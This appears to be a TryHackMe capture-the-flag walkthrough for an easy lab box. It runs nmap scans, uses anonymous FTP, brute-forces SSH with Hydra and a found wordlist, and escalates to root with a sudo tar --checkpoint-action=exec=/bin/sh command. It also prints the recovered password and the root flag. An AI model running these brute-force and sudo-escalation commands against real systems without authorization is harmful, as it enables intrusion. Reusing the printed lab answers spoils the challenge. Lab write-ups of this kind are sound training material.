@@ -1,0 +1,111 @@
+So today we have another ctf challenge in line listed as easy on tryhackme which is cowboyhacker.
+
+
+Main IP :: 10.49.176.228
+
+Performing all port scan with nmap.
+
+Nmap scan report for ip-10-49-176-228.ap-south-1.compute.internal (10.49.176.228)
+Host is up (0.00015s latency).
+Not shown: 55529 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Let's now perform service and detection version scan.
+
+NMAP scan report for ip-10-49-176-228.ap-south-1.compute.internal (10.49.176.228)
+Host is up, received echo-reply ttl 64 (0.00028s latency).
+Scanned at 2026-05-31 04:01:26 UTC for 11s
+
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.5
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.49.125.254
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: PASV failed: 550 Permission denied.
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 1d:46:13:9a:03:82:3f:38:5c:db:15:fb:8d:1b:d3:ee (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfAOEAr9ladY+dHf5uQQqk79Wvf0nXliwwtoWctIe5wk4W5MQBTcyyyQRD/rqlZdMETqZx5O8jaG9esOuuD+8sSJQ9ESg+i5CHt3wNg1ulCVUwrlepzQKJB0q7Bj9W5FWwWvEg7f/6pbXQMmlcfpr/3JMv7m7jgYID2bPMCr5JLtrzFTjvvyyyr1ecNBwFa0FebNOmWEOxeCE8j/HplK7mPg/THQXplhfmqQxle79HUum3KqfxdSAimSkSmrQoCzn7bNKCdiEElbYX9xZQUXT/RugjPy7akGKLtSm6mG9WsWWOxEFsyMZ+Hc5AETVwAzZfgQXOn1XDQIwaVFgmyRkLJiKN0OcbLw5Q2vtt8sI9vQFkX3RnmMkHEf3e5kWl6qH7DkCxnTlCHsTITb66L8j+9+th50tbkIwsveCiLNO14dBE2eCWU5i/mMAgK0Xm01FkjCsDmPp+C6m/zCmWV6XNwFVxFpN9FwDTS/9oFFtTkmyBIJKmnum67xKxavzpv6E=
+|   256 98:09:01:24:18:e4:2b:21:c2:0d:28:de:07:6d:5f:fc (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJuwAFfG67wg7wajEmKfpThsN0CizIBxPhvMf9qxds2KBJLRdvBGf+DZ4F6h3L99ctn7Wru83SzIJvuSNieJHm0=
+|   256 27:87:ec:77:d8:20:07:b6:8f:b5:81:10:e5:4c:24:e7 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGNiazqIqyQZkTmyht7guhIma3DtmKljHTiRlYSyj0Q5
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Connecting with the ftp as it has anonymous login allowed.
+
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .
+drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..
+-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+226 Directory send OK.
+
+we get this files from ftp server let's try tp get and read all the files.
+
+so locks.txt has kind of password maybe a password list.
+
+Also moving with the task we have 2 task listed here
+
+ cat task.txt 
+1.) Protect Vicious.
+2.) Plan for Red Eye pickup on the moon.
+
+-lin
+
+and with this we get the user-name lin.
+
+hydra -l lin -P locks.txt ssh://10.49.176.228 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-31 04:04:54
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
+[DATA] attacking ssh://10.49.176.228:22/
+[22][ssh] host: 10.49.176.228   login: lin   password: RedDr4gonSynd1cat3
+
+and we have the ssh password with the brute-forcing part.
+
+and after logging in to the ssh as lin we have user.txt
+
+TIME FOR PRIVILEGE ESCALATION::
+
+sudo -l
+[sudo] password for lin: 
+Matching Defaults entries for lin on ip-10-49-176-228:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on ip-10-49-176-228:
+    (root) /bin/tar
+
+    
+ sudo /bin/tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+/bin/tar: Removing leading `/' from member names
+# whoami
+root
+# cat /root/root.txt
+THM{80UN7Y_h4cK3r}
+
+so finding helped me with the gtfobins and we found this and became root user.
+
